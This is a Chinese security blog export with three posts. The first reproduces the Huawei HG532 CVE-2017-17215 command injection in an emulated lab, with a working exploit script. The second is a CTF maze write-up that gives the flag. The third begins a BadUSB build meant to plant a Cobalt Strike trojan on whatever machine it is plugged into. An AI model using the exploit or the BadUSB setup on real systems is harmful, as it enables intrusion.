<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">sudo brctl addbr br0                     # 添加一座名为 br0 的网桥</span><br><span class="line">sudo brctl addif br0 ens33                # 在 br0 中添加一个接口</span><br><span class="line">sudo brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议</span><br><span class="line">sudo brctl setfd br0 1                   # 设置 br0 的转发延迟</span><br><span class="line">sudo brctl sethello br0 1                # 设置 br0 的 hello 时间</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up    # 启用网卡接口</span><br><span class="line">sudo dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址</span><br><span class="line">sudo brctl show br0                      # 查看虚拟网桥列表</span><br><span class="line">sudo brctl showstp br0                   # 查看 br0 的各接口信息</span><br><span class="line">sudo tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问</span><br><span class="line">sudo brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure>



<p><code>qemu</code> 启动脚本如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"> </span><br><span class="line">sudo qemu-system-mips \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel vmlinux-2.6.32-5-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mips_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -net nic \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>



<p>我运行了启动脚本 <code>boot.sh</code> ，但发现一直没有回显，用 <code>ps -ef</code> 查看，发现是 <code>7069</code> 号进程卡住了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310251120088.png" alt="image-20231025112029984"></p>
<p>经过反复尝试，将启动脚本里的 <code>vmlinux-2.6.32-5-5kc-malta</code> 改成 <code>vmlinux-2.6.32-5-4kc-malta</code> 就能成功把 <code>qemu</code> 给启起来（原因我也没搞明白，不知道是不是这个下载内核的版本影响）</p>
<p>进入 <code>qemu</code> 后，首先执行 <code>ip add</code> 命令，确保能看到 <code>IP</code> 并可以正常和宿主机通信</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252011708.png" alt="image-20231025201126562"></p>
<p>宿主机执行 <code>scp squashfs-root.tar.gz root@10.214.140.139:/root/</code> 命令，将解压的文件系统传入 <code>qemu</code> 中（传输前最好把文件夹给压缩一下，传入后再解压）</p>
<p>提前用 <code>ssh</code> 再连一个到 <code>qemu</code> 上，后续执行程序 <code>mic</code> 时会把当前 <code>shell</code> 给卡住，所以先弄个 <code>ssh</code>（其实命令加上 <code>&amp;</code> 给它放到后台运行也没问题）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252019907.png" alt="image-20231025201917804"></p>
<p>移动到刚传入的 <code>/root/squashfs-root</code> 目录，执行下面的命令来做出隔离环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod -R 777 squashfs-root</span><br><span class="line">cd squashfs-root/</span><br><span class="line">mount --bind /proc proc</span><br><span class="line">mount --bind /dev dev</span><br><span class="line">chroot . /bin/sh</span><br></pre></td></tr></table></figure>



<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>按照漏洞披露信息来看，需要先打开 <code>37215</code> 端口，并向该端口下的 <code> /ctrlt/DeviceUpgrade_1</code> 地址发送数据包。</p>
<p>首先执行命令 <code>grep -r &quot;37215&quot; ./</code> ，查看字符串 <code>37215</code> 出现在了哪个文件里</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310251325450.png" alt="image-20231025132521370"></p>
<p>发现 <code>mic</code> 包含了字符串 <code>37215</code> ，猜测是该程序打开了 <code>37215</code> 端口，因此将 <code>mic</code> 运行</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252046935.png" alt="image-20231025204627701" style="zoom:50%;" />



<p>执行一会发现这个 <code>ssh</code> 连上来的终端卡住了（刚刚的命令我都是在 <code>ssh</code> 上来的这个终端执行的），此时查看 <code>IP</code> ，发现网卡 <code>eth0</code> 的 <code>IP</code>  没了，网桥 <code>br0</code> 的 <code>IP</code> 被改成了 <code>192.168.1.1</code> ，也就导致 <code>ssh</code> 的连接断了。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252054123.png" alt="image-20231025205409991"></p>
<p>执行 <code>ifconfig eth0 192.168.110.112/24 up</code> ，将网卡改回原本正常的 <code>IP</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252055156.png" alt="image-20231025205522011"></p>
<p>宿主机执行 <code>ping</code> 命令，发现已经可以继续和 <code>qemu</code> 进行通信了（如果换回原本的 <code>IP</code> 还无法通信，<strong>确定一下虚拟机开的是不是桥接模式</strong>，我最开始用的是 <code>NAT</code> ，<code>IP</code> 改回正常的也依然无法通信，折腾了半天才发现要开桥接🥲）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252058228.png" alt="image-20231025205816128"></p>
<p>在 <code>qemu</code> 中执行命令 <code>netstat -aut</code> 发现端口 <code>37215</code> 已经打开</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252057621.png" alt="image-20231025205747452"></p>
<p>在宿主机上执行 <code>nmap -p- -Pn 192.168.110.112</code> ，对 <code>qemu</code> 开放的所有端口进行扫描，此时也能够看到 <code>37215</code> 成功的暴露了出来</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252111532.png" alt="image-20231025211157380" style="zoom:50%;" />



<p>使用 <code>exp</code> 进行攻击验证，因为找了一下隔离环境中可用的命令，发现没有什么适合反弹 <code>shell</code> 的。这里就只用 <code>mkdir zikh26</code> 创建目录的命令来演示一下效果吧</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">Authorization = <span class="string">&quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Authorization&quot;</span>: Authorization&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-----CVE-2017-17215 HUAWEI HG532 RCE-----\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;s:Envelope s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;s:Body&gt;</span></span><br><span class="line"><span class="string">        &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;NewStatusURL&gt;;mkdir zikh26;&lt;/NewStatusURL&gt;</span></span><br><span class="line"><span class="string">            &lt;NewDownloadURL&gt;;mkdir ZIKH26;&lt;/NewDownloadURL&gt;</span></span><br><span class="line"><span class="string">        &lt;/u:Upgrade&gt;</span></span><br><span class="line"><span class="string">    &lt;/s:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/s:Envelope&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://192.168.110.112:37215/ctrlt/DeviceUpgrade_1&#x27;</span>, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nstatus_code: &quot;</span> + <span class="built_in">str</span>(r.status_code))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + r.text)</span><br></pre></td></tr></table></figure>



<p>运行 <code>exp.py</code> 的时候，发现脚本卡住了，于是我手动 <code>ctrl+c</code> 给退出了</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252119217.png" alt="image-20231025211956983" style="zoom:50%;" />



<p>第二次运行的时候还是卡住，然后我想着执行命令 <code>nmap -p- -Pn 192.168.110.112</code> 扫一下，确保端口还开着。结果扫了一下，<code>exp.py</code> 就正常执行了…😶‍🌫️</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252125070.png" alt="image-20231025212554572"></p>
<h3 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3><p>漏洞在 <code>UPnP</code> 里，启动的是 <code>mic</code> 。那肯定是 <code>mic</code> 经过一系列调用后执行了 <code>UPnP</code> ，但是我看了一下 <code>mic</code> 里的字符串，以及 <code>UPnP</code> 字符串存在的那几个程序，并没有找到这之间的关系。因此这条漏洞链最终触发的完整细节我并没探究清楚，再加网上没有找到有文章对于这部分的分析，那就先……🥴</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://research.checkpoint.com/2017/good-zero-day-skiddie/">Huawei Home Routers in Botnet Recruitment - Check Point Research</a></p>
<p><a href="https://www.iotsec-zone.com/article/384">一些经典IoT漏洞的分析与复现（新手向） - IOTsec-Zone</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/486923010">HG532e漏洞复现(cve-2017-17215) - 知乎 (zhihu.com)</a></p>
<p><a href="https://blog.csdn.net/The54No1/article/details/129362750">HG532命令执行漏洞复现（CVE-2017-17215）_attifyos 密码-CSDN博客</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
        <category>复现CVE</category>
      </categories>
      <tags>
        <tag>MIPS架构</tag>
        <tag>命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title>2023工业信息安全技能大赛—鹏城锦标赛复现-工控maze</title>
    <url>/posts/9a31f2d.html</url>
    <content><![CDATA[<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241843107.png" alt="img"></p>
<p>这道所谓的工控题目其实就是一道CTF的流量分析+逆向的迷宫题。鉴于是第一次认真复现和总结流量分析和逆向的题目，感觉学到了不少东西，写篇博客记录一下。</p>
<span id="more"></span>

<h2 id="题目附件"><a href="#题目附件" class="headerlink" title="题目附件"></a>题目附件</h2><p>链接：<a href="https://pan.baidu.com/s/1RFHOLYmpAFbkPiR29dnA7g?pwd=c1cs">https://pan.baidu.com/s/1RFHOLYmpAFbkPiR29dnA7g?pwd=c1cs</a><br>提取码：c1cs</p>
<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>开始拿到流量包是这么一个情况</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241646140.png" alt="image-20231024164647831"></p>
<p>选择一个 <code>TCP</code> 包，追踪流</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241647390.png" alt="image-20231024164744234"></p>
<p>选择红框标注的这个箭头，可以往后翻找数据流</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241649246.png" alt="image-20231024164912089"></p>
<p>再往后翻一个流的时候，发现是 <code>7z</code> 字符串开头的，猜测这个流量里可能藏了一个 <code>7z</code> 文件</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241652035.png" alt="image-20231024165234880"></p>
<p>查看一下这个流对应的几个数据包，发现最后的包是 <code>RST</code> 标志位，这表明因为异常中断了这次的通信连接，所以这个流显示的并不是文件完整的数据。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241654253.png" alt="image-20231024165406121"></p>
<p>因为之后会换个端口继续重传，结合这第一部分的信息可知，用 <code>(ip.src == 192.168.40.199 &amp;&amp; ip.dst == 192.168.40.41) &amp;&amp; (tcp.flags.push == 1) </code> 过滤出 <code>192.168.40.199</code> 与 <code>192.168.40.41</code> 通信时在应用层传输有效数据的报文（如下所示）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241710560.png" alt="image-20231024171057410"></p>
<p>用命令 <code>tshark -r maze.pcapng -Y &quot;(ip.src == 192.168.40.199 &amp;&amp; ip.dst == 192.168.40.41) &amp;&amp; (tcp.flags.push == 1)&quot; -T fields -e tcp.payload &gt; 1.txt</code></p>
<p>将数据以文本形式导入到 <code>1.txt</code> 文件中，再用 <code>010editor</code> 打开是这个样子的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241713917.png" alt="image-20231024171302683"></p>
<p>选择 <code>010editor</code> 里面的导入十六进制，导入的文件用的就是 <code>1.txt</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241713130.png" alt="image-20231024171333047" style="zoom:50%;" />



<p>这样就拿到了这个 <code>7z</code> 文件的原始数据</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241714552.png" alt="image-20231024171449459" style="zoom:50%;" />



<p>将其保存后，就能正常解压里面的文件。拿到后发现是个 <code>exe</code> 文件，直接放到 <code>IDA</code> 里逆向分析</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241715552.png" alt="image-20231024171553486" style="zoom:50%;" />



<h2 id="代码逆向"><a href="#代码逆向" class="headerlink" title="代码逆向"></a>代码逆向</h2><p>通过下面的关键代码能猜测出这是一个迷宫游戏（部分变量已将其重命名）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241717738.png" alt="image-20231024171731597"></p>
<p>结合着运行程序和静态分析时的关键字符串，能够判断出走通迷宫的字符串，能输出 <code>Congratulations!</code> ，那么这个字符串就是 <code>flag</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241720237.png" alt="image-20231024172004109"></p>
<p>结合着 <code>IDA</code> 动态调试，首先能够确定输入函数和输出函数。当输入完数据后，确定了两个变量，分别是输入的字符串 <code>buf</code> 和字符串长度 <code>buf_length</code>（已经对其重命名）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241723309.png" alt="image-20231024172352249" style="zoom:50%;" />



<p>迷宫题通常会用一个一维数组来表明一个图（团队里的逆向手说的 😋），因此上下移动的话，移动距离应该加一行的长度，而左右移动的话距离只加很短，由此能判断是横向移动还是纵向移动。</p>
<p>通过这个规律，最终能重命名出表示横、纵、单次移动距离、移动次数这些变量名称（具体逆向过程不再记录，下面给出我重命名变量后的代码）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( buf[(_DWORD)v7] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">          heng = v18 + <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;H&#x27;</span>:</span><br><span class="line">          ++zong;</span><br><span class="line">          move_num += <span class="number">10</span>;</span><br><span class="line">          ++step;</span><br><span class="line">          <span class="keyword">if</span> ( zong &lt; <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">          v9 = zong &lt;= <span class="number">8</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;K&#x27;</span>:</span><br><span class="line">          heng = v18 - <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">          zong += <span class="number">2</span>;</span><br><span class="line">          move_num += <span class="number">20</span>;</span><br><span class="line">          ++step;</span><br><span class="line">          <span class="keyword">if</span> ( zong &lt; <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">          v9 = zong &lt;= <span class="number">8</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;P&#x27;</span>:</span><br><span class="line">          heng = v18 - <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>:</span><br><span class="line">          --zong;</span><br><span class="line">          move_num -= <span class="number">10</span>;</span><br><span class="line">          ++step;</span><br><span class="line">          <span class="keyword">if</span> ( zong &lt; <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">          v9 = zong &lt;= <span class="number">8</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>:</span><br><span class="line">          zong -= <span class="number">2</span>;</span><br><span class="line">          move_num -= <span class="number">20</span>;</span><br><span class="line">          ++step;</span><br><span class="line">          <span class="keyword">if</span> ( zong &lt; <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">          v9 = zong &lt;= <span class="number">8</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line">          heng = v18 + <span class="number">1</span>;</span><br><span class="line">LABEL_18:</span><br><span class="line">          ++step;</span><br><span class="line">          v18 = heng;</span><br><span class="line">          <span class="keyword">if</span> ( heng &gt;= <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v9 = heng &lt;= <span class="number">8</span>;</span><br><span class="line">LABEL_20:</span><br><span class="line">            <span class="keyword">if</span> ( v9 &amp;&amp; *((_DWORD *)v16 + heng + move_num) != <span class="number">1</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_27;</span><br></pre></td></tr></table></figure>

<p>移动的规则明白后，就剩起点和终点的坐标，以及地图和地图边界问题了。</p>
<p>起点坐标就是变量 <code>heng</code> <code>zong</code> 的初始值 <code>(1,1)</code></p>
<p>终点坐标通过下面三行代码可以分析出来，输出 <code>Congratulations!</code> 的条件就是移动次数要小于等于 <code>12</code> 且 <code>heng</code> 和 <code>zong</code> 要为 <code>8</code> ，所以判断出终点坐标为 <code>(8,8)</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( step &gt; <span class="number">12</span> || zong != <span class="number">8</span> || heng != <span class="number">8</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">v10 = sub_2916F0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Congratulations!&quot;</span>);</span><br></pre></td></tr></table></figure>



<p>再看下输出 <code>Congratulations!</code> 的条件，每次执行任何一个操作（移动策略），都会到 <code>LABEL_20</code> 代码处进行判断，也就是每次移动后都要判断当前位置是否已经到达终点。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241742791.png" alt="image-20231024174245709"></p>
<p>关键代码 <code>if ( v9 &amp;&amp; *((_DWORD *)v16 + heng + move_num) != 1 )</code> 表面 <code>heng</code> <code>zong</code> 都要小于等于 <code>8</code> ，且 <code>(v16+heng+move_num)</code> 不等于 <code>1</code> 才能往下走。第一个条件的 <code>8</code> 有可能就代表地图的边界，也就是一行只有八个可移动点，第二个条件则代表当前位置是否位于墙，也就是不可走的点位（众所周知，迷宫一定都是有墙的，这里的 <code>1</code> 能猜测到就是墙的意思）</p>
<p>如果说地图边界是 <code>8</code>的话，就很难解释纵向移动 <code>1</code> 或者 <code>2</code> 时，为什么 <code>move_num</code> 这个变量（已被重命名）加减的是 <code>10</code> 或者 <code>20</code> 了。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241749962.png" alt="image-20231024174944908" style="zoom: 67%;" />



<p>经过分析后，只有一种解释。横向和纵向可移动的点位只有 <code>8</code> 个，但是横纵的边界是有墙的。而 <code>move_num</code> 每次加一行算的是所有可移动点位和不可移动点位。（大致轮廓确定如下，<code>1</code> 代表墙 <code>0</code> 代表可走的范围）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 1 1 1 1 1 1 1 1 1</span><br><span class="line">1 0 0 0 0 0 0 0 0 1</span><br><span class="line">1 0 0 0 0 0 0 0 0 1</span><br><span class="line">1 0 0 0 0 0 0 0 0 1</span><br><span class="line">1 0 0 0 0 0 0 0 0 1</span><br><span class="line">1 0 0 0 0 0 0 0 0 1</span><br><span class="line">1 0 0 0 0 0 0 0 0 1</span><br><span class="line">1 0 0 0 0 0 0 0 0 1</span><br><span class="line">1 0 0 0 0 0 0 0 0 1</span><br><span class="line">1 1 1 1 1 1 1 1 1 1</span><br></pre></td></tr></table></figure>



<p>最后一步就是根据数组画出真正的图，根据上面分析，已知存在一百个点位。观察数组 <code>v16</code> ，一共有 <code>25</code> 个元素，每个元素占 <code>16</code> 个字节，总共是 <code>400</code> 字节。能猜测到 <code>4</code> 字节来表示一个点位。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241802516.png" alt="image-20231024180212398" style="zoom: 67%;" />



<p>以 <code>v16[0]</code> 为例，<code>IDA</code> 看到的数据是这样的，这样的显示误导我了很久（我一直以为这个直接看到的就是最终的点位图，但这和前面分析的不一样，连周围的墙都没有…）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241806726.png" alt="image-20231024180617688"></p>
<p>实际上应该将其转为 <code>dd</code> （双字型，<code>Define Double Word</code>），这样看到的数据才是对的。把所有的数据全部转换出来，按照每十个点位一行来把图画出来</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241808131.png" alt="image-20231024180855089"></p>
<p>最终的地图如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1, 1, 1, 1, 1, 1, 1, 1, 1, 1</span><br><span class="line">1, 0, 0, 1, 0, 0, 0, 1, 0, 1</span><br><span class="line">1, 1, 0, 1, 0, 0, 0, 1, 0, 1</span><br><span class="line">1, 0, 0, 0, 0, 1, 1, 0, 0, 1</span><br><span class="line">1, 0, 1, 1, 1, 0, 0, 0, 0, 1</span><br><span class="line">1, 0, 0, 0, 1, 0, 1, 0, 1, 1</span><br><span class="line">1, 0, 1, 0, 0, 0, 1, 0, 0, 1</span><br><span class="line">1, 0, 1, 1, 1, 1, 1, 1, 0, 1</span><br><span class="line">1, 1, 0, 0, 0, 0, 0, 0, 0, 1</span><br><span class="line">1, 1, 1, 1, 1, 1, 1, 1, 1, 1</span><br></pre></td></tr></table></figure>

<p>按照这个走法，输入对应的字符即可</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241811035.png" alt="image-20231024181113991"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310241812331.png" alt="image-20231024181215291"></p>
<p>所以最后的 <code>flag</code> 为 <code>flag&#123;WMKMBHBVBMWM&#125;</code></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/wgf4242/p/17767653.html#autoid-0-8-0">2023工业信息安全技能大赛—鹏城锦标赛 WriteUp - wgf4242 - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>玩转树莓派之zero w配合P4wnP1 ALOA实现badusb</title>
    <url>/posts/1bb8b02f.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近浅玩了一下树莓派，本以为要焊接电路板，搞硬件。也算是为之后拆路由器读芯片练练手，接触后发现给树莓派烧录完系统，基本还是玩的软件层（也可能是境界不够🤔）。本文记录了我用树莓派 <code>zero w</code> 配合 <a href="https://github.com/RoganDawes/P4wnP1_aloa">P4wnP1 ALOA</a> 做了一个 <strong>badusb</strong> ，最终配合 <code>Cobalt Strike</code> 生成的木马以及红队大哥做的免杀，可以达到插谁，谁成肉鸡的效果😎</p>
<span id="more"></span>

<p><strong>声明</strong>：文中所涉及的技术、思路和工具仅供以安全为目的的学习研究使用，任何人不得将其用于非法用途以及盈利等目的，由此产生的任何后果，自行承担！</p>
<h2 id="效果演示"><a href="#效果演示" class="headerlink" title="效果演示"></a>效果演示</h2><p><video controls height='100%' width='100%' src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/video/badusb.mp4"></video></p>
<h2 id="给树莓派烧录系统"><a href="#给树莓派烧录系统" class="headerlink" title="给树莓派烧录系统"></a>给树莓派烧录系统</h2><p>在京东上买了个树莓派 <code>zero w</code> ，到手后看到是长这个样子的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310121457256.jpg" alt="_-1234400694_IMG_20231012_145519_1697093734000_xg_0"></p>
<p>再准备一张内存卡（我用的 <code>16G</code> ）和读卡器</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310121505064.jpg" alt="_2131233179__cd67aa62f855909728f1bd3210ca6ed2_347696290_IMG_20231012_150450_0_xg_0"></p>
<p>下载 <code>SDFormatter</code> ，先格式化内存卡</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309281253959.png" alt="image-20230928125302819"></p>
<p>这里确定选好盘后，直接点击格式化即可</p>
<p>然后去下载想要烧录的镜像，我这里是直接用的 <a href="https://github.com/RoganDawes/P4wnP1_aloa/releases/tag/v0.1.1-beta">P4wnP1_aloa</a>  ，它是一个基于 <code>kali</code> 的系统</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310121510600.png" alt="image-20231012151057467"></p>
<p>将镜像解压出来后，下载 <code>Win32DiskImager</code> ，用其将镜像烧录到内存卡中</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309281258994.png" alt="image-20230928125821950"></p>
<p>选择好镜像和要写入的设备，点击写入即可</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309281258475.png" alt="image-20230928125854421"></p>
<p>这里会有一个弹框，点击 <code>yes</code> ，等待十分钟左右烧录完毕</p>
<h2 id="启动和访问树莓派"><a href="#启动和访问树莓派" class="headerlink" title="启动和访问树莓派"></a>启动和访问树莓派</h2><p>将烧录完系统的内存卡插入到树莓派，拿一根 <code>USB</code> 数据线插到图中标红的接口，这个接口既可以给树莓派供电又可以传输数据，而左边看起来相同的接口只可以供电</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310121528649.png" alt="image-20231012152802290"></p>
<p>如此树莓派就启动了，可以选择用一个转接头加上扩展坞连接键盘，并插上一根 <code>HDMI</code> 线连接一个显示器，当做正常的电脑来使用。也可以选择只插一根 <code>USB</code> 数据线进行供电，然后连接树莓派自身热点（密码为 <code>MaMe82-P4wnP1</code>），热点名称就是很显眼的这个</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310121532933.png" alt="image-20231012153230886"></p>
<p>通过 <code>ssh</code> 连接（用户名 <code>root</code>，密码 <code>toor</code>）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310131221162.png" alt="image-20231012154234134"></p>
<p>因为我手头正好有显示器和扩展坞，所以这两种方法我都用过了。</p>
<h2 id="HIDScript"><a href="#HIDScript" class="headerlink" title="HIDScript"></a>HIDScript</h2><p><code>P4wnP1_aloa</code> 的 <code>web</code> 端其实做的挺好的，访问 <code>172.24.0.1:8000</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310131221640.png" alt="image-20231012155258706"></p>
<p>这里其他的选项，看名称或者查看官方说明都能知道个七七八八。我直接记录好玩的地方，选择这个 <code>HIDSCRIPT</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310131222755.png" alt="image-20231012155641198"></p>
<p>这里我们可以编辑代码，让树莓派来充当 <strong>badusb</strong> 的作用，模拟键盘的输入。因为我玩的也比较浅，这里记住这五个的用法其实就差不多了</p>
